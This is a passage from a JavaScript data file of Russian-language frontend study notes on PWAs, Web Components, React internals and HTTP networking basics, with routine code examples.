    { "src": "/icon-512.png", "sizes": "512x512", "type": "image/png", "purpose": "maskable" }
  ]
}
\`\`\`
\`\`\`html
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="#000000">
\`\`\`

**display варианты:**
\`\`\`
standalone  — как нативное приложение, без браузерного UI (самый популярный)
fullscreen  — полный экран без каких-либо элементов браузера
minimal-ui  — минимальный браузерный UI (кнопки назад/вперёд)
browser     — обычная вкладка браузера
\`\`\`

**Установка — кастомный баннер:**
\`\`\`js
let deferredPrompt;

window.addEventListener('beforeinstallprompt', (e) => {
  e.preventDefault();
  deferredPrompt = e;
  showInstallButton();
});

installButton.addEventListener('click', () => {
  deferredPrompt.prompt();
  deferredPrompt.userChoice.then(choice => {
    if (choice.outcome === 'accepted') console.log('Установлено!');
    deferredPrompt = null;
  });
});
\`\`\`
Браузер показывает баннер автоматически если: HTTPS + manifest с иконками + SW зарегистрирован + пользователь провёл достаточно времени на сайте.

**Push уведомления:**
\`\`\`js
// 1. Запросить разрешение:
const permission = await Notification.requestPermission();

// 2. Подписаться (VAPID ключ генерируется на сервере):
const subscription = await registration.pushManager.subscribe({
  userVisibleOnly: true,
  applicationServerKey: vapidPublicKey
});
// 3. Отправить subscription на сервер — он будет слать уведомления

// 4. В SW получаем push:
self.addEventListener('push', (event) => {
  const data = event.data.json();
  event.waitUntil(
    self.registration.showNotification(data.title, {
      body: data.body,
      icon: '/icon.png',
      data: { url: data.url }
    })
  );
});

// 5. Клик по уведомлению:
self.addEventListener('notificationclick', (event) => {
  event.notification.close();
  event.waitUntil(clients.openWindow(event.notification.data.url));
});
\`\`\`

**Проверка:** DevTools → Application (Manifest, Service Workers, Cache Storage). Lighthouse — аудит PWA.

**Преимущества:** без App Store, автообновление, офлайн, push, индексируется поисковиками.

**Ограничения:** iOS — push только с iOS 16.4+; нет доступа к некоторым нативным API (Bluetooth, NFC).`},{name:"WebComponents, ShadowDOM, Custom Elements",level:"4",content:`**Web Components** — набор браузерных API для создания переиспользуемых кастомных HTML элементов с инкапсулированной логикой и стилями. Без фреймворков — нативный браузер.

Три составляющих: **Custom Elements**, **Shadow DOM**, **HTML Templates**.

**Custom Elements — создание своих тегов:**
\`\`\`js
class MyButton extends HTMLElement {
  constructor() {
    super();
    // инициализация — не трогать DOM здесь!
  }

  connectedCallback() {
    // элемент добавлен в DOM — здесь работаем с DOM
    this.render();
  }

  disconnectedCallback() {
    // элемент удалён из DOM — чистим listeners, таймеры
  }

  attributeChangedCallback(name, oldValue, newValue) {
    this.render(); // атрибут изменился
  }

  static get observedAttributes() {
    return ['color', 'disabled']; // какие атрибуты отслеживать
  }

  render() {
    this.textContent = this.getAttribute('label') || 'Click';
  }
}

// имя обязательно содержит дефис!
customElements.define('my-button', MyButton);
\`\`\`
\`\`\`html
<my-button color="red" label="Submit"></my-button>
\`\`\`

**Shadow DOM — изолированное DOM-дерево.** Стили снаружи не проникают внутрь и наоборот:
\`\`\`js
class MyCard extends HTMLElement {
  connectedCallback() {
    const shadow = this.attachShadow({ mode: 'open' });
    shadow.innerHTML = \`
      <style>
        .card { border: 1px solid #ccc; padding: 16px; }
        h2 { color: navy; } /* не утечёт наружу */
      </style>
      <div class="card">
        <h2><slot name="title">Default Title</slot></h2>
        <p><slot>Default content</slot></p>
      </div>
    \`;
  }
}
customElements.define('my-card', MyCard);
\`\`\`
\`\`\`html
<my-card>
  <span slot="title">My Title</span>
  <p>Card content</p>
</my-card>
\`\`\`

**mode: open vs closed:**
\`\`\`js
this.attachShadow({ mode: 'open' });   // element.shadowRoot — доступен
this.attachShadow({ mode: 'closed' }); // element.shadowRoot — null
\`\`\`

**Slots — проекция внешнего контента внутрь Shadow DOM:**
Именованный slot — \`slot="name"\` для конкретного места.
Дефолтный slot — без имени, принимает всё остальное.

**HTML Templates — шаблоны которые парсятся, но не рендерятся сразу:**
\`\`\`html
<template id="card-template">
  <div class="card">
    <h2 class="title"></h2>
  </div>
</template>
\`\`\`
\`\`\`js
const clone = document.getElementById('card-template').content.cloneNode(true);
clone.querySelector('.title').textContent = this.getAttribute('title');
this.attachShadow({ mode: 'open' }).appendChild(clone);
\`\`\`

**CSS переменные — единственный способ стилизовать Shadow DOM снаружи:**
\`\`\`css
/* снаружи: */
my-button { --btn-color: red; }

/* внутри Shadow DOM: */
button { color: var(--btn-color, blue); }
\`\`\`

**Жизненный цикл:** constructor → connectedCallback → attributeChangedCallback → disconnectedCallback

**Web Components vs React:**
\`\`\`
                  Web Components     React
Фреймворк         не нужен           нужен React
Изоляция стилей   Shadow DOM         CSS Modules / styled
Реактивность      вручную            автоматически
Переиспользование любой фреймворк    только React
\`\`\`

**Когда использовать:** дизайн-системы для разных фреймворков, виджеты для встраивания на сторонние сайты.
**Примеры:** GitHub UI, Google Material Web, YouTube.`}]},{id:"react",title:"REACT",icon:"⚛️",color:"#61DAFB",topics:[{name:"Компоненты, свойства: Props, State, однонаправленный поток данных",level:"2",content:`**Однонаправленный поток:** данные (props) текут сверху вниз. Обратно — через колбэки.

**Props** — неизменяемы (read-only), передаются от родителя.
**State** — принадлежит компоненту, изменяется через setter, вызывает ререндер.

**Ререндер дочерних:** по умолчанию ВСЕ дети ререндерятся при ререндере родителя. React.memo — предотвращает, если props не изменились.

**Ловушка с memo + колбэками:** новая функция каждый ререндер → новая ссылка → memo бесполезен. Решение: useCallback.`,score:4.5},{name:"Особенности синтаксиса JSX",level:"2",content:"**JSX → React.createElement(type, props, children) → объект (React-элемент)**\n\n`className` вместо `class` (зарезервированное слово), `htmlFor` вместо `for`.\n\nВ React 17+ — `_jsx()` вместо createElement, не нужен `import React`.",score:4},{name:"Хуки: встроенные и пользовательские",level:"2",content:`**useState** — состояние компонента
**useEffect** — побочные эффекты (API, подписки)
**useMemo** — мемоизация результата вычисления
**useCallback** — мемоизация функции (= useMemo(() => fn, deps))
**useRef** — ссылка на DOM / хранение данных без ререндера
**useContext** — потребление контекста
**useReducer** — сложное состояние (как мини-Redux)
**useTransition** — помечает обновление как низкоприоритетное (UI не зависает при тяжёлых ререндерах)
**useLayoutEffect** — как useEffect, но синхронно после мутации DOM до отрисовки. Для измерения DOM и предотвращения визуального мерцания. Стоит дороже useEffect.
**useId** — стабильный уникальный ID для пары label/input. Решает проблему гидратации при SSR:
\`\`\`js
const id = useId();
return <><label htmlFor={id}>Name</label><input id={id} /></>;
\`\`\`
**useImperativeHandle(ref, () => api, deps)** — выставить наружу только нужные методы:
\`\`\`js
const Input = forwardRef((props, ref) => {
  const inputRef = useRef();
  useImperativeHandle(ref, () => ({
    focus: () => inputRef.current.focus(),
    clear: () => { inputRef.current.value = ''; }
  }));
  return <input ref={inputRef} />;
});
// Родитель: ref.current.focus() — только выставленное API
\`\`\`
**useSyncExternalStore(subscribe, getSnapshot)** — подписка на внешние сторы с поддержкой Concurrent Mode. Именно так работают Zustand, Redux Toolkit, Jotai.

**Правила хуков:**
1. Только на верхнем уровне (не в if/for/вложенных функциях)
2. Префикс \`use\`
React запоминает хуки по **порядку вызова**.`,score:4},{name:"Жизненный цикл компонента",level:"2",content:`**3 фазы:** Mounting → Updating → Unmounting

**useEffect маппинг:**
\`\`\`js
useEffect(() => { ... }, []);     // componentDidMount
useEffect(() => { ... }, [dep]);  // componentDidUpdate (для dep)
useEffect(() => {
  return () => { ... };           // componentWillUnmount
}, []);
\`\`\`

**shouldComponentUpdate** → React.memo (для функциональных).`,score:4},{name:"Фрагменты",level:"2",content:"Группировка без лишнего DOM-узла: `<Fragment>` или `<>...</>`.\n\n`<>` — нельзя передать key. `<Fragment key={id}>` — можно. Единственный случай для полного Fragment — списки.",score:5},{name:"Компоненты высшего порядка",level:"3",content:`**HOC** — функция, принимающая компонент → возвращающая новый с расширенной функциональностью.

\`\`\`jsx
function withAuth(Component) {
  return function(props) {
    if (!useAuth()) return <Redirect to="/login" />;
    return <Component {...props} />;
  };
}
const ProtectedPage = withAuth(Dashboard);
\`\`\`

HOC не изменяет оригинальный компонент, а оборачивает. Сейчас заменён хуками.`,score:4},{name:"Virtual DOM",level:"3",content:`**Зачем нужен Virtual DOM**

Прямые операции с реальным DOM дорогие — каждое изменение может вызвать reflow и repaint. Если при каждом обновлении состояния перерисовывать весь UI через innerHTML, это будет крайне медленно.

Virtual DOM — это легковесный JS-объект, который описывает как должен выглядеть DOM:
\`\`\`js
// JSX <div className="box"><p>Hello</p></div>
// компилируется в:
{
  type: 'div',
  props: { className: 'box' },
  children: [{ type: 'p', props: {}, children: ['Hello'] }]
}
\`\`\`

При изменении состояния React строит новое дерево VDOM и сравнивает его со старым — это называется **diffing**. В реальный DOM попадают только минимальные изменения.

**Reconciliation — алгоритм сравнения деревьев**

Наивный diff двух деревьев — O(n³). React использует эвристики и делает это за O(n):

**1. Разный тип элемента → снести поддерево и построить заново:**
\`\`\`jsx
// было:
<div><Counter /></div>
// стало:
<span><Counter /></span>
\`\`\`
React видит div → span: старый DOM-узел удаляется. Все дочерние компоненты (Counter) вызывают componentWillUnmount / cleanup useEffect. Их state уничтожается. Новое поддерево монтируется с нуля — componentDidMount / useEffect запускаются заново.

**2. Одинаковый тип DOM-элемента → обновить только изменившееся:**
\`\`\`jsx
// было: <div className="old" title="x" />
// стало: <div className="new" />
\`\`\`
DOM-узел тот же — React только патчит атрибуты (className меняет, title удаляет). Дочерние компоненты продолжают жить, их state сохраняется — рекурсивно применяется тот же алгоритм.

**2б. Одинаковый тип компонента → обновить props, перерендерить:**
\`\`\`jsx
// было: <Counter step={1} />
// стало: <Counter step={2} />
\`\`\`
Экземпляр компонента тот же — React обновляет props и вызывает рендер. State сохраняется. Запускается useEffect у которого изменились deps.

**3. Списки → React не знает что с чем сопоставить без key:**
\`\`\`jsx
// Без key при добавлении в начало React перерисует все элементы
// С key React знает: этот элемент переместился, а не пересоздался
[<li key="a">A</li>, <li key="b">B</li>]
\`\`\`
С правильным key: компонент переместился → React переиспользует экземпляр, state сохраняется. Без key или с изменившимся key: компонент считается новым → полный unmount + mount, state теряется.

**Почему index как key — антипаттерн:**
\`\`\`jsx
// Список: [A(0), B(1), C(2)]
// Вставили в начало D: [D(0), A(1), B(2), C(3)]
// React видит: key=0 изменился (был A, стал D) → обновляет
// Все элементы "изменились" → лишние ререндеры + баги со state инпутов
\`\`\`
Key должен быть стабильным уникальным идентификатором из данных (id из БД, slug и т.д.).

**VDOM — не бесплатный:**
Создание и сравнение VDOM тоже стоит памяти и CPU. Для очень простых случаев (статичные страницы, частые мелкие обновления) прямые DOM-операции могут быть быстрее. Svelte и Solid.js отказались от VDOM в пользу компиляции в точечные DOM-обновления.`,score:4},{name:"Способы оптимизации React-приложения",level:"3",content:`1. **memo/useMemo/useCallback** — мемоизация (применять предметно!)
2. **React.lazy + Suspense** — code splitting
3. **Виртуализация списков** — react-window, react-virtualized
4. **Колокализация стейта** — стейт ближе к месту использования
5. **Стейт-менеджеры** — точечная подписка на данные`,score:3.5},{name:"Предохранители (ErrorBoundary)",level:"3",content:`Классовый компонент, ловит ошибки в рендере и жизненном цикле дочерних.

**НЕ ловит:**
• Обработчики событий (onClick и т.д.)
• Асинхронный код (setTimeout, fetch)
• SSR
• Ошибки в самом ErrorBoundary

Можно размещать на разных уровнях дерева — если секция упадёт, остальное работает.`,score:3},{name:"Порталы и как ими пользоваться",level:"3",content:"```jsx\nimport { createPortal } from 'react-dom';\ncreatePortal(<Modal />, document.getElementById('modal-root'));\n```\n\nМонтирует в другой DOM-узел, но события всплывают по **React-дереву** (не DOM-дереву).",score:4},{name:"React Context",level:"3",content:`Решает **prop drilling**. createContext → Provider (value) → useContext.

**Проблема:** изменение value → ВСЕ подписчики ререндерятся. React.memo НЕ помогает (контекст обходит memo).

**Решение:** разделить на отдельные контексты (UserContext, ThemeContext).`,score:4.5},{name:"Концепция SSR. Ограничения применения",level:"3",content:`**CSR vs SSR**

CSR (Client-Side Rendering) — браузер получает пустой HTML и JS-бандл, React строит DOM на клиенте. Пользователь видит белый экран пока JS не загрузится и не выполнится.

SSR (Server-Side Rendering) — сервер запускает React, генерирует готовый HTML и отдаёт его. Браузер показывает контент сразу — ещё до загрузки JS.

**Как работает SSR + гидратация:**
\`\`\`
1. Запрос → сервер рендерит компоненты в HTML-строку
2. Браузер получает готовый HTML → показывает контент (FCP быстрый)
3. JS-бандл загружается
4. hydrateRoot() — React "оживляет" существующий DOM:
   привязывает обработчики событий, восстанавливает state
5. Страница становится интерактивной (TTI)
\`\`\`
Между шагами 2 и 5 — страница выглядит готовой, но не интерактивна. Это называется **hydration gap**.

**React API:**
\`\`\`js
// Клиент CSR:
creatRoot(document.getElementById('root')).render(<App />);

// Клиент SSR — гидратация существующего DOM:
hydrateRoot(document.getElementById('root'), <App />);

// Сервер (старый, синхронный — блокирует поток):
const html = renderToString(<App />);

// Сервер (React 18, стриминг — отдаёт HTML по частям):
const { pipe } = renderToPipeableStream(<App />, {
  onShellReady() { pipe(response); }
});
\`\`\`

**Streaming SSR** — сервер начинает отдавать HTML не дожидаясь рендера всей страницы. Работает вместе с \`<Suspense>\`: тяжёлые части стримятся позже, оболочка приходит сразу.

**Плюсы SSR:**
• Быстрый FCP — пользователь видит контент без ожидания JS
• SEO — поисковики получают готовый HTML
• Работает без JS на клиенте

**Ограничения и минусы:**
• Нет \`window\`, \`document\`, \`localStorage\` на сервере — весь браузерный API недоступен
• Увеличенный TTFB — сервер должен отрендерить прежде чем отдать
• Нагрузка на сервер — React выполняется при каждом запросе
• Гидратация должна дать идентичный DOM — расхождение сервер/клиент вызывает ошибки и полный перерендер
• Сложнее деплой — нужен Node.js сервер, не просто CDN

**Когда SSR оправдан:** публичные страницы с важным SEO, медленные устройства/соединения, контент-сайты. Для дашбордов за авторизацией — CSR проще и достаточно.`,score:3.5},{name:"Form managers",level:"3",content:`**Контролируемые компоненты:** значение в state, React управляет вводом. Каждый keystroke → setState → ререндер.
\`\`\`jsx
const [value, setValue] = useState('');
<input value={value} onChange={e => setValue(e.target.value)} />
\`\`\`
**Неконтролируемые компоненты:** DOM хранит значение, React читает через ref когда нужно.
\`\`\`jsx
const ref = useRef();
<input ref={ref} defaultValue="initial" />
// При сабмите: ref.current.value
\`\`\`

**React Hook Form** — работает через неконтролируемые компоненты + \`register\` (ref под капотом). React не знает о значениях полей до сабмита — ререндер только при ошибках валидации и сабмите. Производительный выбор для больших форм.

**Formik** — контролируемые компоненты, значение каждого поля в state. Каждый keystroke → setState → ререндер всей формы. При 20+ полях начинает тормозить. Зато проще для понимания и работы с зависимыми полями.

**Главное отличие:** RHF читает значения из DOM через refs в момент сабмита. Formik держит все значения в React state всё время — отсюда разница в производительности.

**Валидация схемами:**
\`\`\`js
const schema = z.object({
  email: z.string().email(),
  age: z.number().min(18)
});
const { register, handleSubmit, formState: { errors } } = useForm({
  resolver: zodResolver(schema)
});
\`\`\`

**React 19 — Server Actions**

Server Action — async-функция с директивой \`'use server'\`, которая выполняется на сервере. Вызывается с клиента как обычная функция, но запрос уходит на сервер автоматически — без fetch, без API-роута.

\`\`\`jsx
// actions.ts (серверный код)
'use server';
export async function saveUser(formData: FormData) {
  await db.users.create({ name: formData.get('name') });
  revalidatePath('/users'); // инвалидировать кэш Next.js
}
\`\`\`

\`\`\`jsx
// Вариант 1 — нативная форма (работает даже без JS на клиенте):
<form action={saveUser}>
  <input name="name" />
  <button>Save</button>
</form>

// Вариант 2 — программный вызов:
<button onClick={() => saveUser(formData)}>Save</button>
\`\`\`

**useActionState** — отслеживает состояние Server Action (pending, error, result):
\`\`\`jsx
const [state, formAction, isPending] = useActionState(saveUser, null);

<form action={formAction}>
  <input name="name" />
  <button disabled={isPending}>
    {isPending ? 'Сохраняем...' : 'Save'}
  </button>
  {state?.error && <p>{state.error}</p>}
</form>
\`\`\`

**Плюсы:** нет boilerplate с fetch/useState/loading, прогрессивное улучшение (форма работает без JS), серверный код не попадает в бандл клиента, типобезопасность end-to-end.

**Ограничения:** только в серверных окружениях (Next.js App Router, Remix и т.д.). В чистом React без фреймворка — не работает.`,score:3},{name:"React паттерны. Compound components. render-props",level:"4",content:`**Compound Components:** набор связанных компонентов через Context.
\`\`\`jsx
<Table>
  <Table.Header><Table.Cell>Name</Table.Cell></Table.Header>
  <Table.Row><Table.Cell>Alice</Table.Cell></Table.Row>
</Table>
\`\`\`

**Render-props:** паттерн для переиспользования логики — компонент управляет данными/поведением, а потребитель сам решает как их рендерить.
\`\`\`jsx
// MouseTracker знает координаты, но не знает как их показать
class MouseTracker extends React.Component {
  state = { x: 0, y: 0 };
  handleMove = (e) => this.setState({ x: e.clientX, y: e.clientY });
  render() {
    return <div onMouseMove={this.handleMove}>{this.props.render(this.state)}</div>;
  }
}

// Потребитель сам решает что рендерить с этими данными:
<MouseTracker render={({ x, y }) => <p>Курсор: {x}, {y}</p>} />
<MouseTracker render={({ x, y }) => <Avatar style={{ left: x, top: y }} />} />
\`\`\`
Задача — разделить логику (что происходит) от представления (как выглядит). До хуков это был основной способ переиспользовать логику с состоянием.

Оба паттерна в основном заменены хуками (проще, без wrapper hell). Render-props → кастомный хук. Но иногда встречаются в библиотеках (react-table, Downshift).`,score:3.5},{name:"Механизм Reconciliation",level:"4",content:`**Что запускает reconciliation:**
setState, dispatch (useReducer), обновление контекста, ререндер родителя. React ставит компонент в очередь на перерендер — не выполняет сразу.

**Batching (пакетирование обновлений):**
React 18 автоматически объединяет несколько setState в один ререндер — даже внутри setTimeout, fetch, промисов:
\`\`\`js
// Один ререндер, не три:
setTimeout(() => {
  setA(1);
  setB(2);
  setC(3);
}, 1000);
\`\`\`
До React 18 batching работал только в обработчиках событий.

**Work-in-progress tree (двойная буферизация):**
React держит два дерева: текущее (current) — то что видит пользователь, и work-in-progress — то что строится. Diffing идёт между ними. Когда всё готово — деревья меняются местами атомарно. Пользователь никогда не видит незавершённое состояние.

**Почему O(n), а не O(n³):**
Наивный diff любых двух деревьев — O(n³). React использует две эвристики которые делают это O(n):
1. Элементы разного типа никогда не сравниваются — сразу снос и пересоздание
2. key — подсказка React какой элемент списка соответствует какому

**Bailout — пропуск поддерева:**
Если React при обходе видит что props и state компонента не изменились — он пропускает всё поддерево целиком, не заходя в него:
\`\`\`js
// React.memo — bailout если props не изменились (поверхностное сравнение)
const Child = React.memo(({ value }) => <div>{value}</div>);

// Нюанс: новая функция каждый ререндер = новая ссылка = memo бесполезен
<Child onClick={() => doSomething()} /> // ❌
<Child onClick={useCallback(() => doSomething(), [])} /> // ✅
\`\`\`

**Важный нюанс — ререндер ≠ обновление DOM:**
Реакт может вызвать render-функцию компонента, посчитать VDOM и решить что реальный DOM менять не нужно — изменений нет. Ререндер дорог памятью (создание VDOM), но не обязательно дорог DOM-операциями.`,score:4},{name:"Архитектура Fiber",level:"4",content:`**Проблема до Fiber (React 15 и раньше):**
Reconciliation был синхронным рекурсивным обходом стека. Начав обход — нельзя остановиться. При большом дереве JS занимал main thread на десятки миллисекунд: анимации замерзали, ввод не отвечал.

**Что такое Fiber:**
Fiber — это новый движок reconciliation (React 16+) и одновременно структура данных. Каждый компонент в дереве — это Fiber-узел:
\`\`\`js
// Упрощённо что хранит Fiber-узел:
{
  type,          // тип компонента или DOM-тег
  props,         // текущие props
  stateNode,     // DOM-узел или экземпляр класса
  memoizedState, // state хуков (связный список)
  child,         // первый дочерний Fiber
  sibling,       // следующий сосед
  return,        // родительский Fiber
  flags,         // что нужно сделать: Update | Placement | Deletion
}
\`\`\`
Вместо рекурсии — связный список. Обход можно остановить после любого узла и продолжить позже.

**Две фазы работы:**

**1. Render фаза — прерываемая:**
React обходит Fiber-дерево, вызывает render-функции, строит work-in-progress дерево, помечает узлы флагами (Update, Placement, Deletion). Эту работу можно прервать — браузер получит управление для обработки ввода или анимации — и возобновить позже.
Поскольку фаза прерываемая, тело компонента может вызваться несколько раз за одно обновление. Именно поэтому рендер должен быть чистой функцией.

**2. Commit фаза — непрерываемая:**
React берёт список изменений (effectList) и атомарно применяет к реальному DOM. Прерывать нельзя — пользователь не должен видеть промежуточное состояние.
Три подфазы commit:
• **Before mutation** — вызываются getSnapshotBeforeUpdate
• **Mutation** — применяются DOM-изменения
• **Layout** — вызывается useLayoutEffect (синхронно после DOM, до отрисовки)

После этого браузер рисует экран, затем асинхронно вызывается useEffect.

**Приоритеты и Concurrent Mode:**
Fiber позволяет назначать приоритет обновлениям. Срочное (ввод пользователя) → выполняется немедленно. Несрочное → можно отложить:
\`\`\`js
// useTransition — помечает обновление как несрочное
const [isPending, startTransition] = useTransition();
startTransition(() => setFilter(value)); // React может прервать при вводе

// useDeferredValue — дерево с этим значением рендерится с низким приоритетом
const deferred = useDeferredValue(heavyValue);
\`\`\`

**StrictMode вызывает рендер дважды** именно из-за Fiber: проверяет что компонент идемпотентен (два вызова дают одинаковый результат). В продакшне — один раз.`,score:4},{name:"Server components",level:"4",content:`**Проблема которую решают RSC:**
При SSR компонент рендерится на сервере в HTML, но его JS-код всё равно попадает в бандл — для гидратации. Тяжёлые зависимости (markdown-парсер, date библиотека) едут клиенту даже если там они не нужны.

Server Components (RSC) — компоненты которые выполняются только на сервере. Их JS в бандл не попадает вообще. Нет гидратации — нечего гидратировать.

**Как работает:**
\`\`\`jsx
// app/page.tsx — Server Component по умолчанию в Next.js App Router
export default async function Page() {
  const posts = await db.posts.findMany(); // прямой доступ к БД — без fetch!
  return <PostList posts={posts} />;
}
\`\`\`
Компонент async — можно await прямо в теле. Данные фетчатся на сервере, клиент получает готовый результат.

**Граница server/client — директива \`'use client'\`:**
\`\`\`jsx
// ❌ Без директивы — серверный, нет интерактивности
export function StaticCard({ title }) {
  return <div>{title}</div>;
}

// ✅ С директивой — клиентский, полный React
'use client';
export function LikeButton({ postId }) {
  const [liked, setLiked] = useState(false);
  return <button onClick={() => setLiked(true)}>Like</button>;
}
\`\`\`
\`'use client'\` — граница бандла. Всё что импортирует клиентский компонент тоже попадает в бандл.

**Что можно/нельзя:**
\`\`\`
Server Component:         Client Component:
✅ async/await            ✅ useState, useEffect
✅ прямой доступ к БД     ✅ обработчики событий
✅ env переменные          ✅ браузерные API
✅ fs, секретные ключи     ✅ useContext
❌ useState/useEffect      ❌ прямой доступ к БД
❌ обработчики событий     ❌ async компонент
❌ браузерные API
\`\`\`

**RSC Payload — что летит по сети:**
Сервер отдаёт не HTML, а специальный формат (JSON-подобный). Клиентские компоненты — ссылки на JS в бандле. Серверные — готовый результат рендера. React на клиенте собирает из этого дерево.

**Composition pattern — как совмещать:**
\`\`\`jsx
// Серверный компонент передаёт children клиентскому
// Важно: children рендерится на сервере, не попадает в бандл клиента
async function Page() {
  const data = await fetchData();
  return (
    <ClientShell> {/* 'use client' */}
      <ServerContent data={data} /> {/* остаётся серверным */}
    </ClientShell>
  );
}
\`\`\`

**RSC vs SSR — разница:**
SSR — рендер на сервере + гидратация на клиенте, JS едет клиенту. RSC — рендер на сервере, JS не едет, нет гидратации. Они совместимы: страница может использовать и SSR и RSC одновременно.`,score:4}]}],zf=[{id:"network",title:"СЕТЬ",icon:"🔗",color:"#66BB6A",topics:[{name:"ip-адрес и hostName",level:"1",content:`**IP-адрес** — уникальный числовой идентификатор устройства в сети.
• **IPv4:** 192.168.1.1 (4 октета, 32 бита, ~4.3 млрд адресов)
• **IPv6:** 2001:0db8::1 (128 бит, практически неограничено)

**Hostname** — человекочитаемое имя (example.com), преобразуется в IP через DNS.

**localhost** = 127.0.0.1 (loopback). **0.0.0.0** — все интерфейсы.

**Порт** — логический адрес приложения на устройстве (80 — HTTP, 443 — HTTPS, 3000 — dev).`},{name:"Базовое понимание различий POST и GET",level:"2",content:`**GET:**
• Параметры в URL (query string)
• Кэшируется браузером
• Ограничение длины URL (~2048 символов)
• Идемпотентный (повторный запрос = тот же результат)
• Для получения данных

**POST:**
• Данные в теле запроса (body)
• НЕ кэшируется по умолчанию
• Нет ограничения размера тела
• НЕ идемпотентный
• Для создания/изменения данных

**Другие методы:** PUT (полная замена), PATCH (частичное обновление), DELETE (удаление), HEAD (только заголовки), OPTIONS (CORS preflight).`},{name:"Query-параметры",level:"2",content:"Параметры в URL после `?`, разделённые `&`:\n```\nhttps://api.com/users?page=1&limit=10&sort=name\n```\n\n**URLSearchParams API:**\n```js\nconst params = new URLSearchParams('page=1&limit=10');\nparams.get('page');      // '1'\nparams.set('page', '2');\nparams.append('filter', 'active');\nparams.toString();       // 'page=2&limit=10&filter=active'\n```\n\n**Кодирование:** спецсимволы → encodeURIComponent() / decodeURIComponent()."},{name:"REST API",level:"2",content:`**REST** — архитектурный стиль для API.

**Принципы:**
• Ресурсы идентифицируются URL: \`/users\`, \`/users/1\`
• HTTP-методы как операции: GET (read), POST (create), PUT/PATCH (update), DELETE
• **Stateless** — каждый запрос содержит всю необходимую информацию. Сервер не помнит предыдущие запросы.
• Единый интерфейс

**Stateless на примере:**
\`\`\`
// Не REST (с состоянием):
Запрос 1: "залогинься как user123"
Запрос 2: "дай мне мои заказы"  // сервер помнит кто ты

// REST (stateless):
Запрос 1: "залогинься как user123" → получаешь токен
Запрос 2: "дай заказы, вот мой токен: Bearer xxx"
\`\`\`

Преимущества stateless: масштабируемость (любой сервер обработает запрос), простота (не нужно хранить сессии), надёжность (упавший сервер не теряет состояние клиентов).

Именно поэтому JWT популярен в REST — клиент сам хранит токен и передаёт в каждом запросе.

**Хорошие практики:**
\`\`\`
GET    /users       → список пользователей
GET    /users/1     → конкретный пользователь
POST   /users       → создать пользователя
PUT    /users/1     → обновить полностью
PATCH  /users/1     → обновить частично
DELETE /users/1     → удалить
\`\`\`

**Коды ответов:** 200 OK, 201 Created, 204 No Content, 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 500 Internal Server Error.`},{name:"Понимание протокола HTTP",level:"2",content:`**HTTP (HyperText Transfer Protocol)** — протокол запрос-ответ.

**Запрос:**
\`\`\`
GET /index.html HTTP/1.1
Host: example.com
Accept: text/html
Cookie: session=abc
\`\`\`

**Ответ:**
\`\`\`
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=abc
Cache-Control: max-age=3600
\`\`\`

**HTTPS** — HTTP + TLS шифрование. TLS (Transport Layer Security) — протокол, который:
• Шифрует данные — перехваченный трафик нечитаем
• Аутентифицирует сервер — SSL-сертификат подтверждает что это действительно тот сервер
• Обеспечивает целостность — данные не изменены в пути

Как работает: клиент и сервер проводят TLS Handshake — договариваются об алгоритмах, обмениваются сертификатом, генерируют общий симметричный ключ. Дальше всё шифруется этим ключом.

**Коды ответов:**
• **1xx** — информационные (101 Switching Protocols — WebSocket)
• **2xx** — успех (200 OK, 201 Created, 204 No Content)
• **3xx** — редиректы (301 Moved Permanently, 302 Found, 304 Not Modified)
• **4xx** — ошибка клиента (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found)
• **5xx** — ошибка сервера (500 Internal Server Error, 503 Service Unavailable)

**Заголовки:**

**Content-Type** — формат тела запроса/ответа:
\`\`\`
application/json                — JSON
text/html; charset=utf-8        — HTML
text/plain                      — обычный текст
multipart/form-data             — загрузка файлов
application/x-www-form-urlencoded — данные формы
\`\`\`

**Authorization** — передача токена:
\`\`\`
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Authorization: Basic dXNlcjpwYXNz  // base64(login:password)
\`\`\`

**Cache-Control** — управление кэшем:
\`\`\`
no-cache       // всегда проверять актуальность
no-store       // не кэшировать вообще
max-age=3600   // кэшировать 1 час
public         // можно кэшировать везде (CDN + браузер)
private        // только браузер, не CDN
\`\`\`

**Accept** — ожидаемый формат ответа:
\`\`\`
Accept: application/json
Accept: text/html
\`\`\`

**CORS** — управление доступом между доменами:
\`\`\`
// Ответ сервера:
Access-Control-Allow-Origin: https://mysite.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true

// Preflight-запрос браузера:
Origin: https://mysite.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
\`\`\`

**Set-Cookie / Cookie:**
\`\`\`
// Сервер устанавливает:
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

// Браузер отправляет:
Cookie: session=abc123
\`\`\`

**Прочие важные:**
\`\`\`
Content-Length: 348           // размер тела в байтах
Host: api.example.com         // хост назначения
User-Agent: Mozilla/5.0...    // браузер/клиент
Referer: https://site.com     // откуда пришёл запрос
Location: /new-url            // куда редиректить (3xx)
\`\`\`

**HTTP/3:**
• Основан на **QUIC** (поверх UDP вместо TCP)
• Встроенное шифрование TLS 1.3 прямо в QUIC
• Нет head-of-line блокировки на транспортном уровне (в HTTP/2 один потерянный TCP-пакет блокирует все потоки одного соединения)
• **0-RTT** для повторных подключений — быстрее установление соединения
• **Connection migration** — соединение выживает при смене IP (переход Wi-Fi ↔ LTE, критично для мобильных)
• Поддерживается Cloudflare, Google, Fastly`},{name:"Понимание протокола HTTP/2",level:"3",content:`**Главная проблема HTTP/1.1** — один запрос на одно соединение (или очередь). Браузер открывал до 6 параллельных соединений на домен — это лимит.

**HTTP/2 решает это через:**

**1. Мультиплексирование** — несколько запросов через одно соединение параллельно:
\`\`\`
HTTP/1.1: [запрос1] → [ответ1] → [запрос2] → [ответ2]  // очередь
HTTP/2:   [запрос1] ↘
          [запрос2] → [ответ1][ответ2][ответ3]  // параллельно, одно соединение
          [запрос3] ↗
\`\`\`

**2. Сжатие заголовков (HPACK)** — в HTTP/1.1 заголовки передаются как текст при каждом запросе. HTTP/2 сжимает и кэширует — повторяющиеся не передаются.

**3. Server Push** — сервер сам отправляет ресурсы которые понадобятся клиенту:
\`\`\`
Клиент запросил index.html →
Сервер отправляет: index.html + style.css + app.js
// Не ждёт пока браузер разберёт HTML и запросит их
\`\`\`

